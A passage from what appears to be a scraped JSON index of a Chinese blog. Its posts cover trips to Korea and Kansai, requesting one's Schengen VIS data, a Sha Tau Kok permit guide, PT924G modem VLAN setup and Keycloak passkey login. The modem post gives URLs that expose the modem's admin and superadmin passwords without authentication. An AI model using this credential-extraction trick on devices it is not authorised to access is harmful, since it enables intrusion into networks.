Bonito"},{"content":"本次依然是利用夏季周末时间的“特种兵旅行”，周五前往首尔，周日晚上返回。\n本文使用了实验性的HDR AVIF，在部份浏览器上（常见于Android）可能会出现色阶断裂的问题，请催促chromium修复此问题。 行前准备 签证 相比日本签证，韩国签证的申请难度相对简单，并且对于本科毕业生属于“点击就送”。本科毕业生只要凭学信网毕业证明和身份证，即可办理5年多次的韩国签证。签证申请可以通过各地的“韩国签证申请中心”（如广州中心）线下申请。也可以通过邮寄申请（但邮寄申请需要寄送身份证原件并需要附加一点邮件处理费，如果顾虑可以线下办理）。截至2024年夏天，线下办理无需预约，早上签证中心开门之后前往并现场取号即可。\n机票 笔者与同学购买了大湾区航空的机票，HKG-ICN往返大约1100CNY。关于大湾区航空的详细乘机体验可以参考 新航司大湾区航空初体验：更像廉航的香港-东京航线 (hee.ink) 这篇博客。简而言之就是可以预选座位，并且会发一瓶水的廉价航空，体验与全服务航空公司的欧洲内航班接近。值得一提的是笔者与同学返回时由于前往了柜台打印登机牌，被地勤offer了免费更换紧急出口座位的机会，这点值得加分。\n酒店 笔者和同学在Agoda上定了一家首尔车站附近的民宿（R Guesthouse Seoul Station），居住体验还不错，3晚大约花费190USD。\n网络/电源/需要带的东西 电话卡笔者依然是去飞猪上随意买了一家，3天大约20-30元。但店家售卖的卡虽然不限流量，但限速，网速大约10Mbps，不过也够用就是。\n韩国使用220V/60Hz电源，和内地接近，插座使用欧洲标准，因此在网上购买的欧标转换插座搭配能在内地使用的充电器均可正常充电。\n支付 除了地铁公交之外的绝大部份场景均可使用信用卡，笔者换的韩元最后只用在了充交通卡上。韩国的T-Money卡可以在首尔和釜山的地铁，公交上使用，机场的地铁进站口和一些便利店都有售。T-Money也提供了一个HCE卡模拟程序 KOREA TOUR CARD Tmoney ，部分Android手机可以下载，这个App可以用境外信用卡有手续费充值。\n导航 由于韩国对地理信息的管制，Google Maps和Apple Maps在韩国的路径规划功能都不是很正常，POI缺少较为严重。推荐读者下载韩国本地的地图软件Navar Map（网站上只有韩文，App有中，英，日文）也可以同时使用Navar Map找餐厅，评价比较全。\n行程 Day1 香港-首尔 到首尔之后入境花费了大约1h（目前韩国依然需要手写入境卡），入境需要打指纹。入境后，可以乘坐较慢但便宜的仁川国际机场铁道（制式和地铁差不多，可以在旁边的售票机上先买一张T-money卡），或者较快的AREX（贵一些，可以在OTA上买票，会便宜一点）。\n当天晚上吃了首尔车站旁边的第一制面所，吃的是冷面和煎饺。之前没想到的是冷面里竟然还需要加冰块，可能不适合肠胃不好的人（误），但冰镇之后的面确实会筋道一些。\n冷面套餐 晚上随后去了南山塔，依然可以在OTA上买缆车和上塔的联票，可惜当日云比较多，所以只看到了傍晚的天空，没有日落。\n首尔火车站前的公交枢纽 上南山的缆车 信号塔和首尔夜景 南山缆车站 夜晚的首尔站前公交枢纽 Day2 釜山 第二天早上我们一早前往首尔站搭乘了去釜山的KTX列车。韩国的高铁票可以在一些OTA（如trip.com，有手续费）或者微信/支付宝的「韩国Korail火车票」小程序购买（无手续费）。购买流程和内地类似，选车次，选座，填写名字后付款即可出票。大部份的车次出发前24小时外都可以无损退票（OTA可能会收一点手续费）。\n首尔站高铁站台 韩国高铁的进站流程倒是和欧洲类似，不需要提前检票，直接前往站台等车即可，上车后乘务员可能会随机查票，这时候出示车票二维码即可。\n高铁车厢 到达釜山站后，我们去到了青沙浦一带转了一下，青沙浦一带有一个有轨电车和一个类似缆车的小型单轨火车，可以坐在上面看风景。\n釜山公交车，韩国的公交车几乎全是现代的 车内展望 导航时可以用青沙浦站（해운대블루라인파크 청사포정거장）来搜索位置，从釜山站出门到配套的公交站即可坐公交到达（在旁边的一个SK的员工宿舍附近下车，然后走10分钟左右就到了）。\n海边的渔船和海雾 防波堤和灯塔 如果不想坐车，也可以走路在海边栈道转转。我们去的时候海雾偏大，不过到上午十点左右雾就基本散了。这个海边倒是离日本的対馬市很近（100km不到），不知道在完全没有雾的时候有没有机会看到。\n有轨电车 胶囊小火车（右上角） 海边栈道走到底之后可以走到尾浦海滩，旁边有一些小吃街，可以随意找一些店铺尝试一下。中午笔者走到了新世界百货Centum City店的美食广场层吃，吃的也是一些典型韩式闷锅。\n尾浦海滩 一些小吃街和商铺 下午笔者则是在市中心随意逛了一下。\n乐天商场 地铁通道里的小贩 釜山地铁，装修风格和北京90年代左右建设的车站有些类似 随后乘坐傍晚的高铁返回首尔。\n首尔车站里的Safari广告 晚上由于车站旁边都是快餐，就索性试了试便利店的预制食品和车站旁边的一家血肠（店铺名字应该叫火车头年糕之类的，但这家的辣椒放太多了，笔者觉得有些太辣了）。\n晚上在便利店买的芝士甜辣酱饭，笔者感觉韩国的酱料似乎只有这一种甜辣风格的，吃了两三天后就略有些腻了 Day3 首尔 青瓦台，景福宫 当天白天笔者和朋友去参观了青瓦台和景福宫。其中由于韩国总统的办公和官邸已经搬离了青瓦台，因此青瓦台从2023年起就开始对公众开放了，进场前需要提前在网站上预约。\n青瓦台外景 青瓦台内的朝鲜半岛画作《锦绣江山图》 总统官邸 青瓦台的南边就是景福宫，参观完可以直接步行过去。景福宫建筑样式和大中华的建筑较为相似，和古中国王宫的一大区别是景福宫的地面没有铺砖，还是以砂土为主。\n景福宫光化门 正对光化门的李舜臣将军雕像（이순신 장군 동상） 中午笔者和朋友在路边找了一家牛肉粉条汤（金城馆罗州高汤 금성관 나주곰탕 https://naver.me/5FZSRdRT ），笔者认为味道不错，不过朋友认为份量有些太少了。\n牛肉粉条汤 朝鲜战争（韩战）纪念馆 下午则去朝鲜战争（韩战）纪念馆参观了一圈，主要讲述的是韩国立场下的战争过程。\n纪念馆外的联合国军参与国国旗 韩战博物馆中的一幅油画，描述的是平壤人民欢迎李承晚 晚上我们去了宏大周边的商业区逛了一下，吃了一个烤肉店（肉梦 弘大总店 육몽 홍대본점，可以在navar map上预约，会快一些），（两个人消费约700CNY）。\nDay4 首尔-香港 远看维多利亚港 返程到香港附近的天气和能见度都很不错，在飞机上看到了维港。\n近看维多利亚港 机场巴士上看到的晚霞 ","permalink":"https://blog.sparktour.me/posts/2024/08/01/2024-korea-trip/","summary":"\u003cp\u003e本次依然是利用夏季周末时间的“特种兵旅行”，周五前往首尔，周日晚上返回。\u003c/p\u003e\n\n \n\u003cdiv class=\"callout callout-info\"\u003e\n    本文使用了\u003ca href=\"https://zhuanlan.zhihu.com/p/630463136\"\u003e实验性的HDR AVIF\u003c/a\u003e，在部份浏览器上（常见于Android）可能会出现色阶断裂的问题，请催促\u003ca href=\"https://issues.chromium.org/issues/328687167\"\u003echromium\u003c/a\u003e修复此问题。\n\u003c/div\u003e\n\n\u003ch1 id=\"行前准备\"\u003e行前准备\u003c/h1\u003e\n\u003ch2 id=\"签证\"\u003e签证\u003c/h2\u003e\n\u003cp\u003e相比日本签证，韩国签证的申请难度相对简单，并且对于本科毕业生属于“点击就送”。本科毕业生只要凭\u003cstrong\u003e学信网毕业证明和身份证\u003c/strong\u003e，即可办理5年多次的韩国签证。签证申请可以通过各地的“韩国签证申请中心”（如\u003ca href=\"https://www.visaforkorea-gz.com/\"\u003e广州中心\u003c/a\u003e）线下申请。也可以通过邮寄申请（但邮寄申请需要寄送身份证原件并需要附加一点邮件处理费，如果顾虑可以线下办理）。截至2024年夏天，线下办理无需预约，早上签证中心开门之后前往并现场取号即可。\u003c/p\u003e","title":"韩国之旅：一座典型的东北亚大都会"},{"content":"本次周末旅行的起因是我和同学抢到了hkexpress的学生特价机票，往返每个人只要1300HKD。考虑到旅行时间有限，我们决定只在日本关西地区活动，主要游览大阪和京都。\n本文使用了实验性的HDR AVIF，在部份浏览器上（常见于Android）可能会出现色阶断裂的问题，这是已知的浏览器问题。 行前准备 签证 大学生/研究生或者毕业三年内的学生可以用学信网报告申请单次签证（身份证户口本这些基本材料还是需要）。由于日本已经开始签发电子签证，广东的部份旅行社甚至不要求寄护照，资料全程网上上传即可，上传完成之后7-10个工作日能拿到签证。三个月有效，可停留15天。\n机票 同学购买了hkexpress做活动时的学生机票，往返约1300HKD/人。但需要注意hkexpress是廉航，飞机上没有免费的食物和饮料，并且航空公司也不鼓励带自己的吃的上飞机（虽然实际管的不严）。同时，hkexpress的座椅空间相比全服务航司也会略小一些，在它们的A320/A321neo上，座椅靠背甚至是不可调节的。\n酒店 笔者和同学在booking上定了一家大阪的胶囊旅馆（后文有）和京都的一家普通酒店。\n网络/电源/需要带的东西 电话卡笔者去飞猪上随意买了一家，4天（商家按照自然天算）/2G天的套餐约25元。笔者注意到许多商家售卖的本质都是joytel流量卡，这张卡似乎是有多IMSI的功能，能根据用户的地点自动切imsi来避免漫游。这张卡在日本可以接入softbank的网络，速度尚可，约有40Mbps左右。\n日本关西使用100V/50Hz电源，如果只是需要给手机电脑充电的话，大部份的充电器均支持宽电压。需要注意的是，部分充电器（如倍思的Gan Pro 3）和一些带电源插头（结构接近插线板）的适配器的电压宽度可能只有110V-240V或200V-240V，在100V的关西可能会因为电压太低无法启动。我的Gan Pro 3充电器就遇到了此问题，但另外带的苹果原厂的充电器则可以正常使用。\n支付 电车、地铁、公交均可使用交通卡；绝大部分便利店均可使用信用卡、交通卡、微信支付宝、现金；比较大的餐厅可以用信用卡、微信支付宝；寺庙和部分小餐厅可能只收现金。如果不吃特别贵的，只收现金的餐厅，每人带10000日元应该够用。\n交通卡建议使用iPhone开一张Suica（日本也有IC卡联盟，各地的交通卡全国通用），可以用现金和Apple Pay中的信用卡充值，使用大陆发行的银联卡也可以。\n行程 可参考下面的地图，由于是周末旅行只有两个白天的时间，我们花费了半天在大阪，剩下一天半在京都。\nDay1 关西机场-大阪 笔者和同学均是从深圳前往香港转机去日本的，目前在深圳侧的口岸已可使用护照自助通关，并且没有边检会主动介入，让持护照的旅客走人工或主动检查旅客的护照。进入香港侧依然需要填写入境申报表并走人工，机场离境时可以走自助。\n太平洋上空的落日 京都铁道博物馆 神户机场 到达关西机场之后可以乘坐关空快速（HARUKA）前往市区，可以考虑提前在网上的一些OTA购票，会比售票机略为便宜一些。如果不在网上购票，可以在售票机用现金或者交通卡买。\nHARUKA的车厢 天王寺 胶囊旅馆 笔者当晚定了Grand Sauna Shinsaibashi （グランドサウナ心斎橋），旅馆提供不带厕所的小单间（如下图），晚上关上卷帘门之后还算安静。酒店还提供一个温泉池，桑拿房和澡堂，但需要注意的时候这家酒店的澡堂隔间没有帘子，更接近北方的澡堂。\n胶囊旅馆单间 胶囊旅馆的公用卫生间 入住之后笔者和朋友去心斋桥和道頓崛逛了一下，不过因为时间比较晚，心斋桥两侧的商店大都关门了，最终我们选了心斋桥旁边的一家一兰拉面吃了晚饭+夜宵。\n心斋桥筋 心斋桥的路口 道頓崛 一兰拉面 一兰拉面的点单方式非常社恐友好，进门之后先去自助点餐机点餐，拿到餐票之后排队，进入到内部的卡座之后把票交给内台的服务员即可，全程不用说一句话（x。\nDay2 大阪 - 京都 路边的停止标志，日本的许多停止标志上没有STOP，只有「止まれ」 路边的自助停车场，上面是高速 大阪城 从「本丸日本庭園」（旁边的一个小园林）看大阪城 大阪城在天下统一的桃山时代是丰臣秀吉的居城、丰臣政权的中心。后来德川家康以两次大坂之役（冬之阵、夏之阵）消灭丰臣家。此后，江户幕府以大坂城为控制西日本大名的重要据点。不过目前所见的大阪城天守阁是1930年建设的“仿古建筑”（钢筋混凝土结构）。天守阁需要门票入内，可以提前在网上购买，比现场购买略便宜一些。阁内有一些丰臣秀吉的展览和绘画，楼顶上有一个观景台可以看到大阪附近的建筑。\n大阪城 参观完天守阁之后可以由大阪城的北边前往大阪城公园站，乘坐电车即可前往大阪站。\n梅田百货，大阪站 大阪站（梅田百货附近的入口） 中午我们去梅田百货（大阪站附近）吃了一家鳗鱼饭（Unagi-no Nakasho Links Umeda），按照google review上的推荐点了他的白烤鳗鱼饭和传统的蒲烧鳗鱼饭。我们觉得白烤或者蒲烧的鳗鱼吃一两块还不错，但吃多了都有点腻，可能需要和朋友拼着点会比较不错。 白烤鳗鱼饭 吃完饭后顺路去楼下的电器城（友都八喜多媒體梅田店）逛了一下。感觉宣传板报的风格和内地的电器城有挺大的区别，有一种「看到了就知道这是日本」的风格。本身想去最底下一层问问是否有免税的手机卖的，但楼下看起来全是运营商合约机，并且并不免税便作罢。\n卖小家电的区域 卖影音碟片的区域 从大阪站到京都可以坐任何一辆非HARUKA的普速列车，大约需要半小时即可到达京都站。\n京都铁道博物馆 京都铁道博物馆从京都站坐一站电车即可到达。博物馆里有一些车头和车厢可以看，还可以上0系新干线。\n博物馆提供了一台演示售票机，可以打出「京都鉄道博物館駅」售的磁票 晚上我们在京都站的便当商店里买了一盒“神户牛肉饭”（约1300JPY），加热方法类似自热饭，味道和吉野家/食其家的肥牛饭类似： 神户牛肉饭便当 晚上的随拍 晚上在东福寺站门口随意找了一家拉面馆（大黒ラーメン 東福寺店），味道还可以，很便宜，普通拉面只需要500多JPY，只收现金。\n拉面夜宵 Day3 京都 清水寺 参考小红书上的攻略，我们今日早起（指07:45出门，08:30到山门）先去了清水寺，早上的清水寺人确实较少，浏览体验会好很多。清水寺入内需要门票，似乎只可以在售票处现场购买。\n清水寺 清水寺的大殿里可以求御守和求签（日本的求签方式和中国的不太一样，签盒是封闭的，求签者摇一下盒子之后签会从盒子的洞里出来，而不是中国的需要摇动签盒，让签从签盒里掉出来），求完会给你一张纸，可以在网上查询解签。\n建在山上的结构 八坂神社 八坂神社 大门口的马路上的出租车 伏见稻荷大社 伏见稻荷大社以其千本鸟居闻名，不过除非去的很早，应该是比较难拍出旅游书中的照片，因为鸟居下道路的人实在太多了。\n千本鸟居 伏见稻荷大社同样也有御守和签可以求，据说伏见稻荷大社的签的“吉”率会比清水寺高一些。\n入口的大鸟居 白天随拍 中午我们在廻転鮨 銀座おのでら京都店吃了寿司，这家店是米其林餐厅开的回转寿司店（可以理解为平价版，个人观察价格大概是内地元气寿司的两倍，但比元气寿司好吃不少），餐厅的座位类似回转寿司的形式，但实际是顾客用座位前的平板点菜，然后寿司会用传送带送到顾客面前。这家店有意思的地方是制作寿司的时候，你可以选择是否要把芥末加到寿司里面，这样味道会比你后蘸好一些。另根据Google上的评论，建议不要太晚到达餐厅，否则有些食材可能没有了。\nDay4 返回香港 京都到关西机场的票在OTA上购买会比较便宜，购买后需要到绿色的，有护照读取器的机器上扫二维码兑换车票。兑换流程可参考JR West的文章 早上我们按计划乘坐HARUKA前往关西机场并返回香港，但由于路线上的其他列车故障（似乎是撞到了人），因此列车延误了大约一小时，我们原定的指定席也只能改为乘坐自由席。\n返回关西机场 大鳴門橋 港珠澳大桥，左边能依稀看到珠海和港珠澳大桥人工岛 ","permalink":"https://blog.sparktour.me/posts/2024/05/25/2024-japan-kansai-trip/","summary":"\u003cp\u003e本次周末旅行的起因是我和同学抢到了hkexpress的学生特价机票，往返每个人只要1300HKD。考虑到旅行时间有限，我们决定只在日本关西地区活动，主要游览大阪和京都。\u003c/p\u003e","title":"周末日本关西之旅"},{"content":"相信许多人在申请申根签证时，都有听说过Visa Information System (VIS)。VIS允许申根国家交换签证数据。它由中央 IT 系统和将该中央系统连接到国家系统的通信基础设施组成。 它处理与访问或过境申根区的短期居留签证申请相关的数据和决策。该系统可以执行生物识别匹配（主要是指纹），用于识别和验证目的。在申根签证的申请中，他的一大常见用途是保存申请人的指纹信息（这样申请人每5年只需提供一次指纹）。\n在VIS的介绍中，也有提到“数据在 VIS 中保存五年。该保留期限从签发的签证到期日、做出拒签决定之日或做出修改签发签证的决定之日算起。任何人都有权了解他/她在 VIS 中的数据（Any person has the right to be informed about his/her data in the VIS.）。任何人都可以要求纠正有关他/她的不准确数据并删除非法记录的数据。”但互联网上却难以查找到有关自然人如何向移民机构获取此类数据的流程。在本文中，笔者尝试向法国驻中国领事馆申请了自己先前申请的申根签证的个人数据，也在某种程度上解答了“VIS中是否会保存提交的旅行计划等辅助文件”的传言。\n提交数据导出申请 以法国为例，根据cnil（类似香港的隐私专员公署）有关VIS的介绍里，如果申请人居住在在法国以外，相应的数据导出申请应该向当地的大使馆提出。因此，笔者先向法国驻广州领事馆的签证相关咨询邮箱（visas.canton-FSLT@diplomatie.gouv.fr ，可以在 https://cn.ambafrance.org/-Consulat-Canton- 找到）发送了VIS相关的咨询邮件（法国领事馆的自动回复邮件提到咨询时必须带上全名、出生日期、护照号码和电话号码等信息，否则可能不回复，不清楚这是不是必须的）：\nDear Consular Officer,\nI hope this message finds you well. My name is [NAME] (Date of Birth [DOB]), Passport Number [PN]), and I applied for a Schengen visa through the French Consulate in Guangzhou (VISA No. FRAXXXXX). In line with my rights and following the instructions from CNIL (Commission Nationale de l’Informatique et des Libertés https://www.cnil.fr/en/visa-information-system-vis ), I wish to access the information about me entered into the VIS and any other national data system that stores information related to my visa application and entry/exit record.\nCould you kindly guide me on:\n​ • The appropriate contact or department for this request.\n​ • Any specific documents I should provide for verification.\n​ • The necessary procedures I should follow.\nI truly appreciate your assistance and patience in this matter.\n在几天后，笔者收到了领事馆的回信，提到需要给领事馆寄送一封包含护照复印件，身份证复印件和签名申请书的信件，随后会帮我把请求转发至法国本土（Please send us a formal signed mail stating your request with a photocopy of your passport and identification and we will forward this to the headquaters in France）。\n随后，笔者准备了护照复印件，身份证复印件，签证复印件（黑白即可），和一封申请数据导出的信件。申请数据导出的信件是参考斯洛文尼亚的数据导出申请PDF写的：\nDear Officer,\nAccording to Art. 38 of the Regulation (EC) No 767/2008 of the European Parliament and of the Council of 9 July 2008 concerning the Visa Information System (VIS) and the exchange of data between Member States on short-stay visas (VIS Regulation) in connection with Art. 15 of the Regulation (EU) 2016/679 of the European Parliament and of the Council of 27 April 2016 on the protection of natural persons with regard to the processing of personal data and on the free movement of such data, and repealing Directive 95/46/EC (General Data Protection Regulation), I hereby demand:\n- Information about the personal data relating to me being processed in the Visa Information System (VIS).\n(如果EES建成之后，需要导出自己的出入境数据的话，也可以在这里一并申请)\n随后附上自己的个人信息：名字，护照，地址，生日，国籍，签证号码\n笔者将这些材料用挂号信寄出，并写了一封邮件提醒领事馆。\n收到导出的数据 在一个月后，笔者再次收到了领事馆的回信，并随附了一份PDF，里面包含了导出的VIS数据。\n文件封面 文件包括5个章节，分别是照片，申请人的基本信息，申请人的公民身份，旅行证件信息，签证信息（打*号的地方是有信息的栏位，但隐去了个人信息）：\n原文 中文翻译或简要解释 信息 N° 编号 FRA* Pays autorité de saisie 受理国家权威机构 中国（中央权威） Lieu autorité de saisie 受理地点 广州 Nom autorité de saisie 受理机构名称 外交部 Type autorité de saisie 受理机构类型 领事馆 Lieu dépôt 申请提交地点 广州 Pays dépôt 提交申请的国家 中国（中央权威） Date demande 请求日期 * Type demande visa 签证请求类型 Statut 状态 签证已发出 Motif séjour 逗留理由 Durée prévue du séjour / transit 预计逗留/过境时间 État membre responsable 负责的成员国 法国 Autorité représentée 代表的权威机构 Exemption prise empreintes 指纹豁免 否 Prise d\u0026rsquo;empreintes impossible 无法采集指纹 否 Raisons absence empreintes 缺少指纹的原因 Personne invitante 邀请人 Nom 姓名 * Prénom 名字 * Adresse 地址 Compagnie invitante 邀请公司 Nom compagnie invitante 公司名称 住宿的酒店 Adresse compagnie invitante 公司地址 * * Prénom personne à contacter 联系人名字 * Détails du Séjour 逗留细节 Destination principale 主要目的地 Date arrivée 到达日期 * Date prévue départ 预计离开日期 * Frontière première entrée prévue 预计首次入境边界 Route prévue transit 预计过境路线 3. Etat civil du demandeur 申请人民事状态 Nom 姓名 * Nom de naissance 出生时的姓名 Ancien noms de famille 曾用姓氏 Prénoms 名字 * Sexe 性别 * Age 年龄 * Date naissance 出生日期 * Ville naissance 出生城市 * Pays naissance 出生国家 中国 Nationalité actuelle 当前国籍 中国人 Nationalité naissance 出生时国籍 Profession 职业 * Nom employeur 雇主名称 Nom établissement scolaire 学校名称 Adresse 地址 Nom autorité parentale / tuteur 父母/监护人的姓名 Prénom autorité parentale / tuteur 父母/监护人的名字 4. Document de voyage 旅行文件 Type 类型 普通护照 N° 编号 * Pays de délivrance 发证国家 Date délivrance 发证日期 * Ressortissant 国籍 Date fin de validité 有效期结束日期 * 原文 中文翻译或简要解释 信息 Visa 签证 签证 Statut 状态 Visa émis Pays autorité de délivrance 发证国家权威机构 CHINE (Autorité centrale) Nom autorité de délivrance 发证机构名称 Ministère des Affaires Étrangères Lieu autorité de délivrance 发证机构所在地 Canton Type autorité de délivrance 发证机构类型 Poste Consulaire Date délivrance 发证日期 * Lieu délivrance 发证地 Canton Pays délivrance 发证国家 CHINE (Autorité centrale) Etat membre responsable 负责的成员国 FRANCE Autorité représentée 代表的权威机构 Date création décision 决策创建日期 * N° 编号 FRA* Délivrance sur feuillet séparé 是否在单独的文件上发行 FAUX Territoire autorisé à circulation 允许流通的领土 ETATS SCHENGEN Valable pour 有效地区 ETATS SCHENGEN Type 类型（C：短期停留） C : court séjour Date début validité 有效期开始日期 * Date fin de validité 有效期结束日期 * Durée de validité 有效期时长 * Nombre entrées autorisées 允许的入境次数 Plusieurs Durée séjour autorisé 允许停留的天数 * 总结 可以看出，VIS导出的信息中仅包含了申请人本人的证件信息，以及申请国家的邀请人信息，除此之外并未包括更多的有关申请时提交的旅行计划，机票预订等附件。但不排除审核的大使馆/领事馆会单独保存此类附件于其他的地方（但至少应该是不与其他申根国家的审核机构互通，也不会显示在边检口岸的官员处）。\n","permalink":"https://blog.sparktour.me/posts/2024/04/10/export-schengen-vis-info/","summary":"\u003cp\u003e相信许多人在申请申根签证时，都有听说过\u003ca href=\"https://home-affairs.ec.europa.eu/policies/schengen-borders-and-visa/visa-information-system_en\"\u003eVisa Information System (VIS)\u003c/a\u003e。VIS允许\u003ca href=\"https://home-affairs.ec.europa.eu/policies/schengen-borders-and-visa/schengen-area_en\"\u003e申根国家\u003c/a\u003e交换签证数据。它由中央 IT 系统和将该中央系统连接到国家系统的通信基础设施组成。 它处理与访问或过境申根区的短期居留签证申请相关的数据和决策。该系统可以执行生物识别匹配（主要是指纹），用于识别和验证目的。在申根签证的申请中，他的一大常见用途是保存申请人的指纹信息（这样申请人每5年只需提供一次指纹）。\u003c/p\u003e","title":"导出申根签证VIS（Visa Information System）的个人数据"},{"content":" 第二期沙頭角開放計劃將於2024年一月一日展開，首階段容許每日最多1 000名旅客經網上申請禁區許可證後，進入除中英街以外的整個沙頭角遊覽，讓更多人有機會認識沙頭角和鄰近外島的歷史文化和天然地貌，推廣文化生態旅遊。\n申请禁区许可证 由于沙头角位于香港的边境禁区，因此需要申请禁区许可证才可以前往。禁区许可证可以在香港警务处的网站 （https://www.es.police.gov.hk/）上找到，点击电子服务 - 边境禁区许可证即可申请。游客申请时需要用实际入境用的证件申请。\n如果以港澳通行证提交申请，需要提交港澳通行证的正反面（需要签注在提交的时候有效），并且提交一个简单的行程。\n為繼續處理閣下是次沙頭角禁區個人旅遊許可證的申請，請提供以下補充文件，供本處參考。\n請提供往來港澳通行證背後簽注 入境憑證或其他與訪港行程相關的補充資料（例如：車票/機票/酒店預訂記錄/或其他行程資料） 如未能提供所要求的補充資料，是次申請將會被取消。\n如果实在不知道怎么写行程，可以参考下表：\n時間 地點 交通工具 -08:00 深圳福田口岸 - 落馬洲支線管制站（落馬洲港鐵站），抵達香港 步行 -08:15 落馬洲港鐵站 - 上水港鐵站 港鐵 -09:00 上水 - 沙頭角 九巴78K -17:00 參觀沙頭角：參觀沙頭角之角、沙頭角碼頭、日月亭、魚燈廣場、沙頭角舊消防局、中英街花園、三文魚屋、沙頭角鏡中鏡等景點 步行 -18:00 返回上水站 九巴78K -18:30 上水港鐵站 - 落馬洲港鐵站 港鐵 -19:00 落馬洲支線管制站 - 深圳福田口岸，返回深圳市 步行 尽管网站上写的是许可证会在3个工作日内签发，但如果资料齐全，基本一个工作日就可以签发。\n许可证样本 前往沙头角 可以在上水站搭乘九巴士78/78K/78S（8HKD左右，但班次略少，大约半小时一班），或者小巴55K（11HKD左右，坐满发车，班次比较密集）。\n55K小巴站 进入沙头角禁区之前，会有警察上车查禁区通行证和证件。禁区通行证不一定要打印出来，电子版也可以，只要让警察能够扫到二维码就行。\n沙头角路 进入禁区前的检查站 沙头角巴士站的九龙巴士78K，对于巴士，警察会在下车时检查乘客的禁区通行证 沙头角禁区内部 中英街花园 中英街花园（新放的打卡景点） 中英街警岗 目前唯一一个联通中英街的检查站。检查站的另一侧是中英街（但主要归内地管辖）。遗憾的是持有香港侧的禁区旅游通行证并不能进入内地一侧的中英街。\n内地一侧的检查站（旧照片 香港一侧的检查站 游客止步 关闭的新楼街警岗，通过河床之后就是内地 沙头角河 河床 入海口，对面近处是深圳侧的沙头角博物馆 沙头角之角，地上的浮标应该是内地和香港的分界线 九广铁路沙头角站遗址 摆了一台火车模型 沙頭角邨 stk-estate 水路离开沙头角 在浏览完沙头角后，除了乘坐大巴/小巴离开，也可以乘坐「沙頭角 - 荔枝窩/鴨洲/吉澳」的街渡经水路离开沙头角。到达吉奥之后，可以原船返回，或者乘坐「馬料水—吉澳/鴨洲」的轮渡直接返回马料水码头（但这班船只有周末和节假日服务，每天只有一班）。\n船上所见的盐田港 鸭洲 参考 沙頭角一日遊：禁區開放必到景點 | 香港旅遊發展局 (discoverhongkong.com) 第二期沙頭角開放計劃明年一月一日展開（附圖） ","permalink":"https://blog.sparktour.me/posts/2024/02/05/2024-sha-tau-kok-visit/","summary":"\u003cblockquote\u003e\n\u003cp\u003e第二期沙頭角開放計劃將於2024年一月一日展開，首階段容許每日最多1 000名旅客經網上申請禁區許可證後，進入除中英街以外的整個沙頭角遊覽，讓更多人有機會認識沙頭角和鄰近外島的歷史文化和天然地貌，推廣文化生態旅遊。\u003c/p\u003e","title":"沙头角港方禁区一日游"},{"content":"在本文中，我们将介绍如何在PT924G光猫上配置VLAN单线复用，以便在单根光纤上同时传输上网，IPTV和TR069等业务。\n获取超级管理员密码 Manufacturer:youhua ProductClass:PT924G HWVersion: V4.0.00 SWVersion: V10.00.924GD02 参考恩山的帖子：\n访问 http://192.168.1.1:8080/cgi-bin/cgic_systeminfo.cgi 查看useradmin的密码 （web_passwd 一行） 使用 http://192.168.1.1:8080/cgi-bin/index2.asp 登陆光猫 使用同一个session下载 http://192.168.1.1:8080/romfile.cfg 下载后在 \u0026lt;Account\u0026gt;\u0026lt;Common AdminSecurityPageCheck=\u0026quot;Yes\u0026quot; SessionSignatureCheck=\u0026quot;No\u0026quot; /\u0026gt;\u0026lt;Entry0 Active=\u0026quot;Yes\u0026quot; username=\u0026quot;root\u0026quot; web_passwd=\u0026quot;xxxxx\u0026quot;一行即可找到telecomadmin的密码。 关闭本地DHCP服务器 使用telecomadmin帐户登陆后，关闭光猫自己的DHCP Server：\nDHCP配置 关闭端口绑定 假如需要使用LAN1作为单线复用的端口，则需要在所有连接中，关闭LAN1的绑定。\n新建TR069的连接 首先记下TR069连接的VLAN ID和802.1p配置\nTR069 新建一个连接，把VLAN和802.1p配置成和tr069一样，但不要绑定任何端口：\n新建连接 配置VLAN绑定 将端口LAN1配置VLAN绑定。这里的88/46的意思是将光猫里的VLAN ID 46（TR069的端口）映射到VLAN ID 88 （对于客户端的VLAN ID）\nVLAN绑定 配置客户端 ESXI 由于esxi一个交换机只能配置一个vlan id，因此需要新建一个虚拟交换机，声明VLAN ID为88（同上），才可以拿到TR069的DHCP。\nESXI 交换机 在不配置的情况下，宽带拨号可以直接在VLAN ID为0的交换机来拨号。\n如果客户端用的是OpenWRT，可以参考它的VLAN文档配置。\n参考 https://www.jianshu.com/p/5e35a2640716 https://www.right.com.cn/forum/forum.php?mod=viewthread\u0026tid=8251873 https://zhuanlan.zhihu.com/p/19710842 ","permalink":"https://blog.sparktour.me/posts/2024/02/02/pt924g-modem-vlan/","summary":"\u003cp\u003e在本文中，我们将介绍如何在PT924G光猫上配置VLAN单线复用，以便在单根光纤上同时传输上网，IPTV和TR069等业务。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"获取超级管理员密码\"\u003e获取超级管理员密码\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eManufacturer:youhua\nProductClass:PT924G\nHWVersion:   V4.0.00\nSWVersion:   V10.00.924GD02\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e参考\u003ca href=\"https://www.right.com.cn/forum/forum.php?mod=viewthread\u0026amp;tid=8251873\"\u003e恩山\u003c/a\u003e的帖子：\u003c/p\u003e","title":"PT924G光猫配置VLAN单线复用"},{"content":"本文描述了为keycloak配置passkey，webauth，OTP等无密码登陆的流程。本文中的部分配置可能需要Keycloak 23或者更高的版本才能正常运行。\n配置Authentication部分 在keycloak的Authentication - Flow菜单中，复制一份browser flow，笔者把副本取名为了browser with optional webauth and otp。\nDuplicate Browser Flow 在新的flow中，删除browser password form和下面的全部step/flow：\ndelete old form 先添加一个step，选择username Form，设置为required：\n在下面添加一个subflow，命名为passwordless or password or otp：\nadd-subflow 在passwordless or password or otp的subflow里添加Password Form，WebAuth Passwordless Authenticator，OTP Form三个step。着三个step分别对应密码认证，passkey/webauth认证，OTP代码（六位数的二步验证码）认证，并设置这三个step为alternative，即三种方式任选其一即可登陆。\n全部添加完后的效果如下图：\nAuthentication Flow Bind Flow 点击flow右上角的Action，把新创建的flow bind到browser flow（浏览器登陆）：\nbind-flow 在required actions中启用webauth 在Authentication-Required actions里，启用Webauthn Register Passwordless：\nenable-webauth 使用passkey登陆 添加passkey 在帐号面板的的Signing in一节中，可以看到新增了一个Passwordless的选项，点击Set up Security key即可设置Passkey。\nset-security-key 测试Passkey登陆 在输入帐户后，即可看到登陆方式界面\nsign-in-screen 点击Security Key即可使用Passkey登陆。\nchoose-method 其他 如果强制要求用户设置passkey / OTP，Required Actions里的Set as default action需要被勾选。\n参考 